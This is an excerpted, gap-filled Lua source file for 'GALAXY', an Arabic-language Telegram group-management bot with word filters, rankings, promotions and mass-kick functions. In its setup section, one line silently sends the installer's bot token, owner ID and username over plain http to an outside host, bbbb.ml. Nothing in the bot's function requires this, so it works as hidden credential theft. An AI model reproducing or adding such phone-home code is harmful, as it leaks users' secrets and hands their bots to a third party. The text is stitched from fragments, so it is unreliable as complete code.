...
https.request('http://bbbb.ml/GALAXY/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("GALAXY", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/GALAXY
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./GALAXY.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("GA", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S GALAXY -X kill
screen -S GALAXY ./GALAXY
done
]])  
file:close() 
...
local GALAXY_Msg = ''  
if msgs < 100 then 
GALAXY_Msg = 'غير متفاعل ' 
elseif msgs < 200 then 
GALAXY_Msg = 'بده يتحسن ' 
elseif msgs < 400 then 
GALAXY_Msg = 'شبه متفاعل ' 
elseif msgs < 700 then 
GALAXY_Msg = 'متفاعل ' 
elseif msgs < 1200 then 
GALAXY_Msg = 'متفاعل قوي ' 
elseif msgs < 2000 then 
GALAXY_Msg = 'متفاعل جدا ' 
elseif msgs < 3500 then 
GALAXY_Msg = 'اقوى تفاعل '  
elseif msgs < 4000 then 
GALAXY_Msg = 'متفاعل نار ' 
elseif msgs < 4500 then 
GALAXY_Msg = 'قمة التفاعل ' 
elseif msgs < 5500 then 
GALAXY_Msg = 'اسد التفاعل ' 
elseif msgs < 7000 then 
GALAXY_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
GALAXY_Msg = 'احلا تفاعل ' 
elseif msgs < 10000000000 then 
GALAXY_Msg = 'رب التفاعل '  
end 
return GALAXY_Msg 
end
...
function plugin_GALAXYa(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.GALAXYa and msg then
pre_msg = plugin.GALAXYa(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceGALAXY(msg,data) -- بداية العمل
if msg then
...
SourceGALAXYr = ' ゠ههلو عمري 💞⸼\n゠لتفعيل البوت في مجموعتك 𖧧.\n゠اضف البوت مشرف في مجموعتك 𖧧.\n゠ثم ارسل ◝ تفعيل ◟ 𖧧.'
end 
send(msg.chat_id_, msg.id_, SourceGALAXYr) 
end
end
...
send(msg.chat_id_, msg.id_,GALAXY_Msg) 
return false  
end 
if text then    
...
usertext = '\n👤┇ العضو » ['..result.title_..'](t.me/'..(username or 'A_6AA')..')'
...
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'A_6AA')..')'
status  = '\n☑️┇ تم ترقيته مطور في البوت'
...
local GALAXY1_Msg = database:get(bot_id.."GALAXY1:Add:Filter:Rp2"..text..msg.chat_id_)   
if GALAXY1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ العضو ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'A_6AA')..') \n 📬┇'..GALAXY1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if GALAXY_Msg and not Special(msg) then  
local GALAXY_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if GALAXY_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..GALAXY_Msg.."] \n") 
else
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/A_6AA)}\n🚫┇["..GALAXY_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "܁༯┆عذرأ يا  ◃ ["..data.first_name_.."](T.ME/A_6AA)  💞 ܰ\n܁༯┆الملصق التي ارسلتهاا تم منعهاا من المجموعةه  💞 ܰ\n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
Text = [[
𝒚𝒐𝒖 𝒂𝒓𝒆 𝒘𝒆𝒍𝒄𝒐𝒎𝒆 𝒊𝒏 𝒈𝒂𝒍𝒂𝒙𝒚 𝒔𝒐𝒖𝒓𝒄𝒆 🍫
𖣳 ⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤ 𖣳

👨‍🎤 - [𝒔𝒐𝒖𝒓𝒄𝒆 𝒅𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓⁦](t.me/rkrrr) 💘

🧚‍♀ - [𝒔𝒐𝒖𝒓𝒄𝒆 𝒄𝒉𝒂𝒏𝒏𝒆𝒍](t.me/g_5gg) 💘

🧚 - [𝒔𝒐𝒖𝒓𝒄𝒆 𝒎𝒐𝒅𝒊𝒇𝒊𝒄𝒂𝒕𝒊𝒐𝒏𝒔](t.me/a_6aa) 💘

💌 - [𝒕𝒉𝒆 𝒔𝒐𝒖𝒓𝒄𝒆 𝒄𝒐𝒏𝒕𝒊𝒏𝒖𝒆𝒔](t.me/galaxy_sourcebot) 💘

𖣳 ⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤ 𖣳
𝒆𝒏𝒋𝒐𝒚 𝒕𝒐𝒈𝒆𝒕𝒉𝒆𝒓 𝒕𝒉𝒆 𝒎𝒐𝒔𝒕 𝒃𝒆𝒂𝒖𝒕𝒊𝒇𝒖𝒍 𝒔𝒐𝒖𝒓𝒄𝒆 𝒐𝒏 𝒕𝒉𝒆 𝒕𝒆𝒍𝒆𝒈𝒓𝒂𝒎 💞💞
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'A_6AA')..') \n☑️┇ تـم قفـل السيلفي بالتقييد\n⛔┇ الحاله ←التقييد ')  
end,nil)   
...
local UserName = (b.username_ or "A_6AA")
...
database:set(bot_id.."GALAXY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."GALAXY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"܁༯┆ارسل التحذير عند ارسال الكلمة 💞 ܰ")  
database:set(bot_id.."GALAXY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."GALAXY1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."GALAXY1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."GALAXY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"܁༯┆تم منع الكلمه مع التحذير 💞 ܰ")  
database:del(bot_id.."GALAXY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."GALAXY1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."GALAXY1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."GALAXY1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"܁༯┆ارسل الكلمةه الان 💞 ܰ ")  
database:set(bot_id.."GALAXY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."GALAXY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."GALAXY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."GALAXY1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."GALAXY1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."GALAXY1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."GALAXY1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."GALAXY1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."GALAXY1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n٭ 𖤓┆قائمة المنع ☓💞◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do  
local GALAXY_Msg = database:get(bot_id.."GALAXY1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t.."܁ 𖠵 "..k.." ゠ "..v.." ◃ ◞"..GALAXY_Msg.."◜\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n👤┇ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'A_6AA')..')'..'\n☑️┇ تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_, msg.id_,'['..GALAXY_Msg[math.random(#GALAXY_Msg)]..']') 
return false
end
...
send(msg.chat_id_, msg.id_,'📌┇ عدد المجموعات الان » { '..#group..' }'..GALAXYk..''..GALAXY..'\n*☑️┇ الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
GALAXY = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(GALAXY)
...
--------------------------------------------------------------------------------------------------------------
SourceGALAXY(data.message_,data)
plugin_GALAXYa(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
------------------------------------------------------------------------
local GALAXYAbot = database:get(bot_id.."GALAXY1:Add:Filter:Rp2"..text..result.chat_id_)   
if GALAXYAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..GALAXYAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local GALAXY1_Msg = database:get(bot_id.."GALAXY1:Add:Filter:Rp2"..text..result.chat_id_)   
if GALAXY1_Msg then    
send(msg.chat_id_, msg.id_,"🔖┇"..GALAXY1_Msg)
